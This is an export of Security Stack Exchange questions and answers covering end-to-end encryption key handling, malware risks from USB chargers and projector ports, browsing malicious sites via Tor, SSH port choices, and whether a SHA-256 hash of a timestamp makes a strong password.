<p>Make sure the private key does not get lost, like having a secure backup, i.e. well protected against unauthorized access.</p>
","1"
"263846","263846","End-to-end encryption with multiple recipients?","<p>As far as I understand, end-to-end encryption is used to encrypt the content on the client (sender), send it to the server and decrypt it on the client (recipient). The clients store their private keys on the device and the Server stores the public keys for the encryption.</p>
<p>My idea:
Request the public keys from the server, encrypt the data, send it to the Server and store it in a database. The client loads the content from the database and encrypts it with the device.</p>
<p>In my scenario I would like to have x Android tablets which should read the content. So there are multiple recipients.</p>
<p>Does end-to-end encryption make sense? How should I share the private key and should it be shared? I thought about scanning a QR code from a central device. And what happens if the user installs the app and loses the private key? Will the encrypted data be lost? And is there a way to prevent this situation?</p>
","1","4","263855","<blockquote>
<p>Does end-to-end encryption make sense?</p>
</blockquote>
<p>It depends. It will prevent the server (and its admins) from snooping on the data from the users, and at the same time prevent them from helping decrypt data if the encryption key is lost.</p>
<p>End to End Encryption can be a source of headache if your service is used by &quot;persons of interest&quot; (aka criminals, journalists, political persons, etc). In those cases, your service may face pressure from government to either implement a backdoor or somehow expose the data from your users.</p>
<p>How should I share the private key and should it be shared?</p>
<p>It depends on how secure you want your service to appear. If your clients trust your service, you can implement a &quot;share key&quot; direct on the application. It would then share your public key with the intended recipient from inside the application.</p>
<p>If they have moderated trust, it could copy the public key to the clipboard to be pasted on IM apps or sent by email, for example. Or they could generate the key pair outside of the app, import the private key and send the public key to the recipients direct.</p>
<blockquote>
<p>And what happens if the user installs the app and loses the private key? Will the encrypted data be lost? And is there a way to prevent this situation?</p>
</blockquote>
<p>There must no way to decrypt the data without the key, otherwise there's no point in encrypting anything. If you built a secure system and the private key is lost, the data is impossible to decrypt.</p>
<p>You have little to do in this situation. If you store the private key somehow, it's not E2E. If you don't store it at all, a lost key means inaccessible user data forever.</p>
<p>What you can do is encourage the user to backup its key. Giving the user a file with the key is enough to restore it, but you must do so in a way that the user will not disclose this file accidentally.</p>
<p>If the user have two or more devices, you could make the application use the same private key on each one and have a way to transfer the key between devices. This reduces the chances of the user losing access to all his data but increases the chances for an attacker to get access to the private key.</p>
","0"
"263846","263846","End-to-end encryption with multiple recipients?","<p>As far as I understand, end-to-end encryption is used to encrypt the content on the client (sender), send it to the server and decrypt it on the client (recipient). The clients store their private keys on the device and the Server stores the public keys for the encryption.</p>
<p>My idea:
Request the public keys from the server, encrypt the data, send it to the Server and store it in a database. The client loads the content from the database and encrypts it with the device.</p>
<p>In my scenario I would like to have x Android tablets which should read the content. So there are multiple recipients.</p>
<p>Does end-to-end encryption make sense? How should I share the private key and should it be shared? I thought about scanning a QR code from a central device. And what happens if the user installs the app and loses the private key? Will the encrypted data be lost? And is there a way to prevent this situation?</p>
","1","4","264556","<p><strong>It does not make sense to do it this way.</strong> Because the idea behind end to end encryption is a unique key, not a key that is shared with other recipients.</p>
<p>If multiple recipients get the same message it would need the same key. Somebody else could get that from middlemanning from your suggested database if somebody else with that key were using an unsecure connection. Then it isn't even end to end encryption anymore. You might look up SMTP with TLS enabled to encrypt things properly.</p>
","-1"
"263777","263777","Do standard USB chargers contain any OS or firmware that might be infected with malware?","<p>I'd like to know if it is possible to figure out if the USB charger of my smartphone (more info below) contains any operating system or firmware which could be infected by malware.</p>
<p>Let's assume I charge my smartphone with my USB charger:</p>
<ul>
<li>How can I figure out if there is any firmware inside of that charger which might be infected by malware?</li>
<li>Could the charge be infected if I use it to charge a malicious device (e.g. an infected smartphone)?</li>
<li>Could the infection spread subsequently by charging other devices?</li>
</ul>
<p>I use the following charger:</p>
<p><a href=""https://www.amazon.de/SAMSUNG-EP-TA50EWE-CHARGER-MICRO-CABLE-wei%C3%9F/dp/B01CVPV7AS/ref=sr_1_1?keywords=Samsung+EP-TA50EWE"" rel=""nofollow noreferrer"">https://www.amazon.de/SAMSUNG-EP-TA50EWE-CHARGER-MICRO-CABLE-wei%C3%9F/dp/B01CVPV7AS/ref=sr_1_1?keywords=Samsung+EP-TA50EWE</a></p>
<p>A similar model is this one:</p>
<p><a href=""https://www.samsung.com/de/mobile-accessories/travel-adapter-micro-usb-ta20-ep-ta20eweugww/"" rel=""nofollow noreferrer"">https://www.samsung.com/de/mobile-accessories/travel-adapter-micro-usb-ta20-ep-ta20eweugww/</a></p>
","1","3","263790","<p>Many USB chargers are completely passive and are only a power supply with no cpu in them.  These have no firmware in them and it would not be possible to infect them with malware.  These are all 5v and detect resistors on the data lines to determine what maximum current to supply.</p>
<p>Advanced chargers may actively negotiate a higher voltage and current with the device, so the data lines are actually used.  However (presuming a legitimate charger), it is unlikely that the data lines are used in a way that would allow transmitting malware to the charger, and even more unlikely the charger contains anything writable that could store malware.</p>
<p>However, if a charger says it has upgradable firmware, and it doesn't check signatures of what is being uploaded to it, anything is possible.</p>
<p>Also, it would be possible to construct a &quot;charger&quot; that intentionally tried to manipulate the device it is charging.  Answers linked in the comments address this possibility.</p>
","6"
"263777","263777","Do standard USB chargers contain any OS or firmware that might be infected with malware?","<p>I'd like to know if it is possible to figure out if the USB charger of my smartphone (more info below) contains any operating system or firmware which could be infected by malware.</p>
<p>Let's assume I charge my smartphone with my USB charger:</p>
<ul>
<li>How can I figure out if there is any firmware inside of that charger which might be infected by malware?</li>
<li>Could the charge be infected if I use it to charge a malicious device (e.g. an infected smartphone)?</li>
<li>Could the infection spread subsequently by charging other devices?</li>
</ul>
<p>I use the following charger:</p>
<p><a href=""https://www.amazon.de/SAMSUNG-EP-TA50EWE-CHARGER-MICRO-CABLE-wei%C3%9F/dp/B01CVPV7AS/ref=sr_1_1?keywords=Samsung+EP-TA50EWE"" rel=""nofollow noreferrer"">https://www.amazon.de/SAMSUNG-EP-TA50EWE-CHARGER-MICRO-CABLE-wei%C3%9F/dp/B01CVPV7AS/ref=sr_1_1?keywords=Samsung+EP-TA50EWE</a></p>
<p>A similar model is this one:</p>
<p><a href=""https://www.samsung.com/de/mobile-accessories/travel-adapter-micro-usb-ta20-ep-ta20eweugww/"" rel=""nofollow noreferrer"">https://www.samsung.com/de/mobile-accessories/travel-adapter-micro-usb-ta20-ep-ta20eweugww/</a></p>
","1","3","263799","<p>You need to tear it down or find something related for your charger online. Then you need to identify parts in the charger. Some manufacturers provide firmware updates. Some contain small ARM processors including ROM. There is a specification for USB power delivery firmware updates. If it can be updated then you can potentially flash malicious firmware though those are more likely targeted attacks.</p>
","1"
"263777","263777","Do standard USB chargers contain any OS or firmware that might be infected with malware?","<p>I'd like to know if it is possible to figure out if the USB charger of my smartphone (more info below) contains any operating system or firmware which could be infected by malware.</p>
<p>Let's assume I charge my smartphone with my USB charger:</p>
<ul>
<li>How can I figure out if there is any firmware inside of that charger which might be infected by malware?</li>
<li>Could the charge be infected if I use it to charge a malicious device (e.g. an infected smartphone)?</li>
<li>Could the infection spread subsequently by charging other devices?</li>
</ul>
<p>I use the following charger:</p>
<p><a href=""https://www.amazon.de/SAMSUNG-EP-TA50EWE-CHARGER-MICRO-CABLE-wei%C3%9F/dp/B01CVPV7AS/ref=sr_1_1?keywords=Samsung+EP-TA50EWE"" rel=""nofollow noreferrer"">https://www.amazon.de/SAMSUNG-EP-TA50EWE-CHARGER-MICRO-CABLE-wei%C3%9F/dp/B01CVPV7AS/ref=sr_1_1?keywords=Samsung+EP-TA50EWE</a></p>
<p>A similar model is this one:</p>
<p><a href=""https://www.samsung.com/de/mobile-accessories/travel-adapter-micro-usb-ta20-ep-ta20eweugww/"" rel=""nofollow noreferrer"">https://www.samsung.com/de/mobile-accessories/travel-adapter-micro-usb-ta20-ep-ta20eweugww/</a></p>
","1","3","265778","<p>Chinese researchers at Tencent have already figured this out in 2020 and come up with a new attack named “<a href=""https://www.zdnet.com/article/badpower-attack-corrupts-fast-chargers-to-melt-or-set-your-device-on-fire/"" rel=""nofollow noreferrer"">BadPower</a>”, which, by altering a fast charger’s firmware, delivers more power than the charged device can safely handle, thus destroying the device and potentially causing a fire.</p>
","1"
"263738","263738","Can I visit a malicious website by using Tor with settings set to safest or by using NoScript on an ordinary browser with settings set to untrusted?","<p>Can I visit a malicious website by using Tor with settings set to safest or by using NoScript on an ordinary browser with settings set to untrusted?</p>
<p>If not then is there any way to visit a malicious website safely?</p>
","2","3","263755","<p>The Tor &quot;safest&quot; setting reduces the attack surface area of your browser by disabling certain features like JavaScript, SVG, remote fonts, etc. This greatly improves security because these features are often either the source of security bugs themselves, or provide capabilities that improve the reliability of another exploit (think JIT spraying, which doesn't work without JavaScript being enabled). It does not make the browser <em>immune</em> to compromise. It merely raises the bar for attackers.</p>
<p>Note that Tor on its own only provides anonymity, privacy at the ISP-level, and censorship resistance. It does not inherently resist malware or protect you from malicious sites. That is up to the browser.</p>
<p>You could use <a href=""https://tails.boum.org/"" rel=""nofollow noreferrer"">Tails</a> which includes Tor Browser and is amnesic (any data on it will be lost on reboot). This would make it more difficult for malware on a malicious website to establish persistence.</p>
","0"
"263738","263738","Can I visit a malicious website by using Tor with settings set to safest or by using NoScript on an ordinary browser with settings set to untrusted?","<p>Can I visit a malicious website by using Tor with settings set to safest or by using NoScript on an ordinary browser with settings set to untrusted?</p>
<p>If not then is there any way to visit a malicious website safely?</p>
","2","3","268069","<p>My recommended keys to visiting untrusted or known malicious websites</p>
<ul>
<li>know that nothing you do will perfectly protect you</li>
<li>Use Tor on full safety settings
<ul>
<li>this is for anonymity, not security</li>
<li>to a lesser extent a VPN and incognito tab might do</li>
</ul>
</li>
<li>Use some kind of throwaway OS or hardware
<ul>
<li>Raspberry Pie (get a virus and just toss the SD card)</li>
<li>TAILS</li>
<li>Virtual machine (not ideal, but can protect from a virus)</li>
</ul>
</li>
<li>log into nothing, remain anonymous</li>
<li>download nothing (scan anything you do)</li>
<li>know your local network security
<ul>
<li>and how to wipe and refresh your router</li>
</ul>
</li>
<li>prepare to lose whatever device you do this with
<ul>
<li>also the data might get copied and sent to the attacker</li>
</ul>
</li>
</ul>
","0"
"263738","263738","Can I visit a malicious website by using Tor with settings set to safest or by using NoScript on an ordinary browser with settings set to untrusted?","<p>Can I visit a malicious website by using Tor with settings set to safest or by using NoScript on an ordinary browser with settings set to untrusted?</p>
<p>If not then is there any way to visit a malicious website safely?</p>
","2","3","268819","<p>Yes, there are safer ways than just using <strong>tor</strong>. A possible malicious website could have RCE on your Browser, and could have access to your host by running shellcode, considering you don't share any password or cookies with the website, that is the best it can do. Make sure to not give away your ip with either tor or a vpn service, I recommend using both. It will keep your other open ports hidden for such attacks.</p>
<p>You can run a virtual machine with where you are running your browser on, if you can not run a seperate host completely, hence that is what I recommend. It will put a layer of VM between you and your host, giving the hackers very very low chance to reach your host, considering they need RCE on browser + RCE on your VM application.</p>
","0"
"263688","263688","How can we determine if there is actual encryption and what type of encryption on messaging apps?","<p>There are many new messaging apps that claim to be the most secure.</p>
<p>How can we be certain if there is actual encryption and what type of encryption?</p>
<p>Molly, signal, WhatsApp, briar, wire, telegram, Threema.</p>
","14","4","263689","<blockquote>
<p>How can we be certain if there is an actual encryption and what type of encryption.</p>
</blockquote>
<p>Unless you have access to the code and have the knowledge to analyze the specific implementation and algorithm for bugs and design errors, you can only rely on what <strong>independent and widely acknowledged</strong> experts on the topic say. Specifically you cannot rely on claims by the vendor alone, because even with best intentions there are often design errors - cryptography is very complex both in algorithms and in implementation. And while open source implementations are at least open for independent analysis, one should not rely on any claims unless such analysis is actually done by the mentioned experts.</p>
","21"
"263688","263688","How can we determine if there is actual encryption and what type of encryption on messaging apps?","<p>There are many new messaging apps that claim to be the most secure.</p>
<p>How can we be certain if there is actual encryption and what type of encryption?</p>
<p>Molly, signal, WhatsApp, briar, wire, telegram, Threema.</p>
","14","4","263698","<p>If you are only interested in finding if there is some form encryption, you can simply dump the traffic from the app and look at it to see if the contents are encrypted or not following the specs provided by the app (e.g. <a href=""https://core.telegram.org/mtproto"" rel=""nofollow noreferrer"">Telegram</a> or <a href=""https://signal.org/docs/"" rel=""nofollow noreferrer"">Signal</a>).</p>
<p>In many encryption systems, the algorithm used is actually easy to find so the recipient knows what to use. For example, GPG uses an OpenPGP Symmetric-Key Encrypted Session Key Packet as explained in this question: <a href=""https://crypto.stackexchange.com/questions/74465/how-does-gpg-know-what-cipher-algorithm-is-needed-for-decryption"">https://crypto.stackexchange.com/questions/74465/how-does-gpg-know-what-cipher-algorithm-is-needed-for-decryption</a>.
The information you're looking for may be simply present in the traffic from the app.</p>
<p>Of course as mentioned by @Steffen Ullrich, this doesn't mean that the algorithm is correctly implemented.</p>
","6"
"263688","263688","How can we determine if there is actual encryption and what type of encryption on messaging apps?","<p>There are many new messaging apps that claim to be the most secure.</p>
<p>How can we be certain if there is actual encryption and what type of encryption?</p>
<p>Molly, signal, WhatsApp, briar, wire, telegram, Threema.</p>
","14","4","263700","<p>As others have stated, it can be difficult to impossible to validate good encryption implementations, <em>for some definition of good</em>.</p>
<p>Conversely <em><strong>indicators of concern</strong></em> can often be seen, <em>for some definition of concern</em>.</p>
<p>A key <em>(pun intended)</em> indicator is, &quot;<strong>Who owns the encryption Key</strong>&quot;? Did you create the key or was it created for you? If you didn't create the key and don't control it, then it's not yours. Even this criteria can get murky. For example, Proton Mail derives the encryption key from your password (which you created) and does not save either <em>(they say)</em>. Decryption happens only on your client side, but it's via JavaScript they provide. Bottom line is it looks very much like your key but access to it is under the control of Proton Mail.</p>
<p>Another lesser indicator is <strong>many-to-many</strong>, such as a chat App. While not impossible, it's orders of magnitude more difficult to maintain <em>end-to-end</em> encryption for a <em><strong>many-to-many</strong></em> application. Typically these are implemented <em>end-to-server</em> encryption vice true <em>end-to-end</em>.</p>
","10"
"263688","263688","How can we determine if there is actual encryption and what type of encryption on messaging apps?","<p>There are many new messaging apps that claim to be the most secure.</p>
<p>How can we be certain if there is actual encryption and what type of encryption?</p>
<p>Molly, signal, WhatsApp, briar, wire, telegram, Threema.</p>
","14","4","263741","<p>You can connect your phone and computer to same WiFi network and use network traffic analyzing tools such as Wireshark to determine whether or not the packets are encrypted when you send the message, but obviously this will not tell you much about actual implementation (cipher, key exchange etc.). Like others have mentioned, your best bet is to use open-source app which has been verified by experts, or app that is known to be very difficult to break because it has been tried before by experts (eg. Telegram).</p>
","-1"
"263641","263641","Can malware spread through HDMI, Display Port or USB","<p>I have to give a presentation at my university. In the room where I'm going to give the presentation, there is a projector with a HDMI, Display Port, or USB connection. I will have to plug one of them into my laptop.</p>
<p>My question: Could my laptop be infected with malware via one of these connectors? It should be noted that there are probably a lot of other students that have already used them, so the probability that they have already been connected to an infected device is probably quite high.</p>
","2","4","263644","<p>Yes, but it is probably irrelevant.</p>
<p>From the connectors, at least USB is dangerous. It does not only allow many different types of possibly dangerous access like DMA, but there are also devices which, for example, emulate a keyboard and start to type malicious commands as soon as you plug them in.</p>
<p>But it is very unlikely that the projector uses such an attack. The projector itself is probably harmless (when it was bought), otherwise other people would already have complained. I am also not aware of any projector that had malicious firmware.</p>
<p>The question if it can be infected is an interesting one as many modern devices run actual operating systems. It wouldn't be that unlikely that a projector may have an Android system that allows to present slides without plugging in a computer, and such a system can be vulnerable.<br />
But I am also not aware of a malware that first infects an Android (on the device) and then tries to infect computers that are connected to the device. It could also be possible using USB-OTG mode, but very unlikely to find in the wild.</p>
<p>The bottom line is, that I would trust a projector in an university not to infect my device.</p>
","3"
"263641","263641","Can malware spread through HDMI, Display Port or USB","<p>I have to give a presentation at my university. In the room where I'm going to give the presentation, there is a projector with a HDMI, Display Port, or USB connection. I will have to plug one of them into my laptop.</p>
<p>My question: Could my laptop be infected with malware via one of these connectors? It should be noted that there are probably a lot of other students that have already used them, so the probability that they have already been connected to an infected device is probably quite high.</p>
","2","4","263653","<p>It is possible maybe, but I would rate the probability that it is indeed infected as very low. The USB is also probably the only viable attack vector. Also, I have never seen an infected projector.</p>
<p>This would be a highly custom attack. Which will have quite a bad cost/benefit to an attacker. To do such an attack, I would believe that you would need to buy the projector. Then create and test a Malware for it and then somehow be able to bring it to the installed projector. In the end, from the point of view of the attacker, he would just have created an expensive and time costly one time use malware. You can't easily spread it unless everybody uses said projector and you still need to go to every projector one by one as a human malware carrier (not efficient for infection rate over time).</p>
<p>Bottom-line I'd be more careful about usb-drives (thumb drives), random keyboards, maybe usb-cables in public. They can and are used for malicious purposes. But you can trust your projector at School.</p>
","2"
"263641","263641","Can malware spread through HDMI, Display Port or USB","<p>I have to give a presentation at my university. In the room where I'm going to give the presentation, there is a projector with a HDMI, Display Port, or USB connection. I will have to plug one of them into my laptop.</p>
<p>My question: Could my laptop be infected with malware via one of these connectors? It should be noted that there are probably a lot of other students that have already used them, so the probability that they have already been connected to an infected device is probably quite high.</p>
","2","4","263657","<p>Not all of these can spread malware, so I am not sure why others have not been clear about HDMI.</p>
<p>From the three pieces of tech you asked about.</p>
<ol>
<li>HDMI will not transfer malware.</li>
<li>Display ports such as thunderbolt can since it transfers data.</li>
<li>USB can also transfer data such as malware.</li>
</ol>
<p>If security is your concern go with HDMI.</p>
","1"
"263641","263641","Can malware spread through HDMI, Display Port or USB","<p>I have to give a presentation at my university. In the room where I'm going to give the presentation, there is a projector with a HDMI, Display Port, or USB connection. I will have to plug one of them into my laptop.</p>
<p>My question: Could my laptop be infected with malware via one of these connectors? It should be noted that there are probably a lot of other students that have already used them, so the probability that they have already been connected to an infected device is probably quite high.</p>
","2","4","267979","<p><strong>USB</strong></p>
<p>Yes USB <a href=""https://kb.prohacktive.io/en/index.php?action=detail&amp;id=CVE-2015-1769"" rel=""nofollow noreferrer"">is known to be dangerous [1]</a>, for a long time already - just think of the Windows Autorun-Feature combined with e.g. USB sticks. There are <a href=""https://www.bleepingcomputer.com/news/security/heres-a-list-of-29-different-types-of-usb-attacks/"" rel=""nofollow noreferrer""><strong>numerous attacks possible</strong> [2]</a> using USB as a vector.</p>
<p><strong>HDMI</strong></p>
<p>The weaknesses just are not well known enough yet. This also is a possible explanation for why the answers before <em>seemed</em> to undervalue the potential risks originating from HDMI ports.
Although it is not possible to infect your device using the HDMI cable, a malicious device could find alternate routes.</p>
<p>In average, you can say: <a href=""https://news.fiu.edu/2021/cyberstalkers-can-hack-into-hdmi-ports-fiu-researchers-are-studying-a-way-to-detect-these-attacks"" rel=""nofollow noreferrer"">The newer the displaydevice that's connected to it, the more dangerous it can be [3]</a>. This is because many of the newer devicemodels (e.g. SmartTVs, or Monitors with fancy functionalities) today often have their own operating system shipped with them. That being said, it's easy to imagine what it means to infect such monitors using a HDMI connection - it's just infecting an ordinary computer - which in term might have a network cable or a WiFi connection, maybe not right now, but later... Or it might just as well infect the next computer it is plugged into in an ordinary way, e.g. by using the Displayport. Displayports can transfer data and thus are just another perfect vector for executing malicious code on 'remote' systems.</p>
<p>It will not be able to infect your computer using the HDMI Port as a vector. Also I don't know any projectors that run a dedicated operating system. On top of that, infections at universities are less likely than in most other public places.</p>
<p>Yet your question is an important one, since the danger of displaydevices is generally underestimated despite their high number of different connection they mostly can use to approach targets.
It seems like most people wouldn't even consider the displaydevice to be part of the problem after security-related incidents that affected their system.</p>
<p><em>Used links in order of appearance:</em><br />
[1]: <a href=""https://kb.prohacktive.io/en/index.php?action=detail&amp;id=CVE-2015-1769"" rel=""nofollow noreferrer"">https://kb.prohacktive.io/en/index.php?action=detail&amp;id=CVE-2015-1769</a><br />
[2]: <a href=""https://www.bleepingcomputer.com/news/security/heres-a-list-of-29-different-types-of-usb-attacks/"" rel=""nofollow noreferrer"">https://www.bleepingcomputer.com/news/security/heres-a-list-of-29-different-types-of-usb-attacks/</a><br />
[3]: <a href=""https://news.fiu.edu/2021/cyberstalkers-can-hack-into-hdmi-ports-fiu-researchers-are-studying-a-way-to-detect-these-attacks"" rel=""nofollow noreferrer"">https://news.fiu.edu/2021/cyberstalkers-can-hack-into-hdmi-ports-fiu-researchers-are-studying-a-way-to-detect-these-attacks</a></p>
","1"
"263590","263590","Benefits of non-standard SSH port when password authentication is turned off","<p>Is there any benefit of using a non-standard SSH port when <code>PasswordAuthentication</code> is turned off in sshd?</p>
<p>The only benefit of non-standard SSH ports I know of is a reduction of the amount of brute force attempts since most scanners only attempt logins at standard ports. But as far as I know, brute forcing a private key is practically impossible. So it seems to me that this benefit does not apply when authentication is only possible via a private key. Is there any reason I might want to do it anyways?</p>
","0","4","263592","<blockquote>
<p>The only benefit of non-standard SSH ports I know of is a reduction of the amount of brute force attempts since most scanners only attempt logins at standard ports.</p>
</blockquote>
<p>Exactly it's about not getting hundreds of failed SSH attempts daily in your system logs. That's the reason in our org and for my PC which has a direct Internet connection we've changed the default SSH port to something different. I still recommended to use the port under 1024, e.g. 911 because that's the only way to make sure some rogue application running on your PC doesn't take over your actual SSH port/daemon.</p>
<blockquote>
<p>brute forcing a private key is practically impossible</p>
</blockquote>
<p>Nothing that I'm aware of.</p>
<blockquote>
<p>Is there any reason I might want to do it anyways?</p>
</blockquote>
<p>SSHd has been exploited <em>beyond</em> authentication, i.e. it has had certain programming errors which allowed to bypass authentication completely (such a thing was <a href=""https://www.youtube.com/watch?v=HeUZMtznHog"" rel=""nofollow noreferrer"">demonstrated</a> in the original Matrix movie), so by not running it on the default port you make yourself a little bit more secure against possible future attacks as you will have time to upgrade before you get owned.</p>
","0"
"263590","263590","Benefits of non-standard SSH port when password authentication is turned off","<p>Is there any benefit of using a non-standard SSH port when <code>PasswordAuthentication</code> is turned off in sshd?</p>
<p>The only benefit of non-standard SSH ports I know of is a reduction of the amount of brute force attempts since most scanners only attempt logins at standard ports. But as far as I know, brute forcing a private key is practically impossible. So it seems to me that this benefit does not apply when authentication is only possible via a private key. Is there any reason I might want to do it anyways?</p>
","0","4","263598","<p>You are focused in the wrong direction.</p>
<p>If you are running a publicly accessible SSH port, you should also be running <strong>fail2ban</strong> <em>(or the equivalent)</em> to handle brute force attempts.</p>
<p>Whether you want to use a non-standard port has pros and cons:</p>
<ul>
<li>(Con) Some applications don't play well on non-standard ports</li>
<li>(Pro) Some internet providers block standard server ports for
non-business accounts</li>
</ul>
","1"
"263590","263590","Benefits of non-standard SSH port when password authentication is turned off","<p>Is there any benefit of using a non-standard SSH port when <code>PasswordAuthentication</code> is turned off in sshd?</p>
<p>The only benefit of non-standard SSH ports I know of is a reduction of the amount of brute force attempts since most scanners only attempt logins at standard ports. But as far as I know, brute forcing a private key is practically impossible. So it seems to me that this benefit does not apply when authentication is only possible via a private key. Is there any reason I might want to do it anyways?</p>
","0","4","263609","<p>As others have stated, running on a nonstandard port keeps failed login attempts out of your logs.</p>
<p>However, <strong>I would discourage running sshd on a nonstandard port</strong>. Running network services on standard ports helps keep your networks understandable. In the middle of an incident (availability or security), you don't want to waste time trying to reverse engineer which services are running where. Simplicity is an important part of a secure network, and standard ports are simple. It's rare that an attacker who would have compromised your system would be stopped by a nonstandard sshd port, but users of your systems <em>will</em> be confused by nonstandard ports.</p>
<p>If you start running tooling that does automated traffic analysis in your networks, you'll want to be using standard ports. Traffic analysis tools already have rules for standard ports.</p>
<p>If you want <strong>to keep failed attempts out of your logs, run <a href=""https://www.wireguard.com/"" rel=""nofollow noreferrer"">wireguard</a></strong> and require an active wireguard tunnel to access sshd. You can achieve this by binding on localhost (127.0.0.1) rather than all interfaces (0.0.0.0). Unlike sshd, Wireguard makes a number of design decisions that make annoyances by unauthenticated users more difficult.</p>
<p>Wireguard is designed like a state machine driven by timers. Once the timer fires, the state machine advances to the next phase. Without the key material, very little to no influence in the activity of these state machines is possible. You won't find log spam. It's a super minimal attack surface with modern cryptography.</p>
<p>If you don't want to figure out how to set up wireguard, <a href=""https://tailscale.com/"" rel=""nofollow noreferrer"">Tailscale</a> is a proprietary tool that will do most of the heavy lifting for you. Most engineers I speak to remark (with much surprise) that Tailscale takes only 15 minutes to set up. It uses wireguard as the transport layer but offloads key distribution to the wireguard servers.</p>
<p>The goal here is to avoid exposing sshd to the public internet. Changing the port from 22 to 2222 obfuscates the behavior of your server, but putting sshd behind wireguard ensures that only users with the correct wireguard key may access sshd. It's a stronger means of achieving the same goal.</p>
","0"
"263590","263590","Benefits of non-standard SSH port when password authentication is turned off","<p>Is there any benefit of using a non-standard SSH port when <code>PasswordAuthentication</code> is turned off in sshd?</p>
<p>The only benefit of non-standard SSH ports I know of is a reduction of the amount of brute force attempts since most scanners only attempt logins at standard ports. But as far as I know, brute forcing a private key is practically impossible. So it seems to me that this benefit does not apply when authentication is only possible via a private key. Is there any reason I might want to do it anyways?</p>
","0","4","263628","<p>That would probably decrease number of spam in your logs and save you from script kiddies, but it has nothing to do with real security: it is more like security through obscurity approach. But every little bit helps, so you can do that.</p>
<p>To secure SSH I suggest to:</p>
<ul>
<li>Limit access by IP. Do you really want to access your server from any IP address or you probably know for sure all IP addresses you are going to use? In latter case, use <code>ipset</code> list and simply <code>DROP</code> access from any other IP. Even if you do not know IP, you still know the country, right? There are lists of networks for each country, so you can only open ssh for your country.</li>
<li>Use <code>fail2ban</code>: no reason to pollute your logs with zillions of auth failures: just <code>DROP</code> traffic from IP after 2-3 failed attempts.</li>
<li>Obviously, deny passwords and root access: only use keys (as you already do). It is next to impossible to crack modern key. I prefer <code>ed25519</code>. Keys must have passwords (passwordless key could be stolen)</li>
<li>Check your ssh with <a href=""https://sshcheck.com/"" rel=""nofollow noreferrer"">https://sshcheck.com/</a> (open firewall for a while for it): that will help you to remove outdated cipher suites.</li>
<li>Monitor your logs with tools like <code>Logwatch</code>, so you would know if somebody attacks you by brute force.</li>
<li>Keep OpenSSH up-to-date:)</li>
</ul>
","0"
"263582","263582","Is a sha256 hash of a unix timestamp a strong password","<p>I am setting up a postgres db that will never be used by humans. In fact, I really don't need to know it myself ever. I assumed that just using a 256bit(64 alphanumeric chars) hash of a unix timestamp IE:</p>
<pre><code>date +%s%3N | sha256sum
</code></pre>
<p>A very important detail is I am not &quot;hashing a password&quot;... I am hashing a timestamp and <em><strong>using the sha256 hash as the password in the db connection string.</strong></em></p>
<p>would be pretty damn strong. An example of one I could use has 31 lowercase chars and 33 integers, for an entropy of ~330 bits, which is.... well... I'd say pretty damn solid, if not completely insanely overkill. The reason I ask is because it <em><strong>STILL</strong></em> got flagged by chainlink's password complexity check for only having lowercase chars and numbers.</p>
<p>So... My question is, are they right? Is there something wrong with a 64 character alphanumeric password just because it doesn't have fancy capital letters? Is there something inherently wrong with using sha256 algo with a timestamp like this?</p>
<p>I am contemplating raising an issue on their github stating that I should not have to set their <code>SKIP_DATABASE_PASSWORD_COMPLEXITY_CHECK=true</code> flag for such a password, and that they should consider the actual entropy of the password instead of just applying a set of simple rules.</p>
","25","6","263583","<blockquote>
<p>...  for an entropy of ~330 bits, ...</p>
</blockquote>
<p>The question is not how strong a password looks like but how strong it actually is. SHA-256 does not add any entropy at all, so it all depends on what the input to SHA-256 was. And the entropy of the chosen input is pretty low: Assuming that the attacker knows how the password was created, they can test all possible inputs around the time the password might have been created.</p>
<p>A much stronger input would be to use real random data as input:</p>
<pre><code>dd if=/dev/random bs=1 count=32 | sha256sum
</code></pre>
<p>While the output might look similar strong, it is practically impossible to predict the input by the attacker.</p>
","97"
"263582","263582","Is a sha256 hash of a unix timestamp a strong password","<p>I am setting up a postgres db that will never be used by humans. In fact, I really don't need to know it myself ever. I assumed that just using a 256bit(64 alphanumeric chars) hash of a unix timestamp IE:</p>
<pre><code>date +%s%3N | sha256sum
</code></pre>
<p>A very important detail is I am not &quot;hashing a password&quot;... I am hashing a timestamp and <em><strong>using the sha256 hash as the password in the db connection string.</strong></em></p>
<p>would be pretty damn strong. An example of one I could use has 31 lowercase chars and 33 integers, for an entropy of ~330 bits, which is.... well... I'd say pretty damn solid, if not completely insanely overkill. The reason I ask is because it <em><strong>STILL</strong></em> got flagged by chainlink's password complexity check for only having lowercase chars and numbers.</p>
<p>So... My question is, are they right? Is there something wrong with a 64 character alphanumeric password just because it doesn't have fancy capital letters? Is there something inherently wrong with using sha256 algo with a timestamp like this?</p>
<p>I am contemplating raising an issue on their github stating that I should not have to set their <code>SKIP_DATABASE_PASSWORD_COMPLEXITY_CHECK=true</code> flag for such a password, and that they should consider the actual entropy of the password instead of just applying a set of simple rules.</p>
","25","6","263584","<p><strong>Password complexity is not a matter of having a bunch of random-ish characters.</strong></p>
<p>The purpose of password complexity is to make your password harder to guess, not to make your password &quot;look random.&quot; As a result, password complexity meters are not a good way of measuring password complexity, because it is simply not possible for a computer to figure out how an attacker will go about attacking your password.</p>
<p>Similar to <a href=""https://en.wikipedia.org/wiki/Kerckhoffs%27s_principle"" rel=""noreferrer"">Kerckhoffs's principle</a>, it is good practice to assume that the attacker knows how you generated your password. Even if you don't like that assumption, you have now revealed this method in a public forum, so a resourceful attacker could find this Stack Exchange question and deduce that you have used this method to generate passwords.</p>
<p>Under that assumption, this method is potentially problematic. For starters, the SHA-256 hashing algorithm is public knowledge, so if an attacker can guess the input you used, then they can easily compute the hash of that input. Therefore, the hash adds nothing from a security perspective, and may be disregarded (besides which, the database <em>should</em> be doing its own password hashing on top of your sha256sum, and their hashing is <a href=""https://security.stackexchange.com/a/112731/72852"">probably a lot more thorough than that</a>). Your question is equivalent to &quot;Should I use the output of <code>date +%s%3N</code> as a password?&quot;</p>
<p>An attacker may have a good idea of approximately when you generated this password. Your method does go to millisecond precision, so an attacker must try 1000 guesses for each second of uncertainty. But the exact time that you set up the database is probably not a secret! Or at least, you're probably not going to treat it like a secret. Unless you generate the password months in advance (which I doubt), there are all sorts of people who might plausibly know when you set up the database, such as:</p>
<ul>
<li>Coworkers or colleagues.</li>
<li>The hosting provider, if any.</li>
<li>Your own provisioning system or other records.</li>
</ul>
<p>In conclusion, this is a bad plan and you should not do it. Generate your password from scratch using a cryptographically-secure random number generator instead, such as using the code in Steffen Ullrich's answer.</p>
","46"
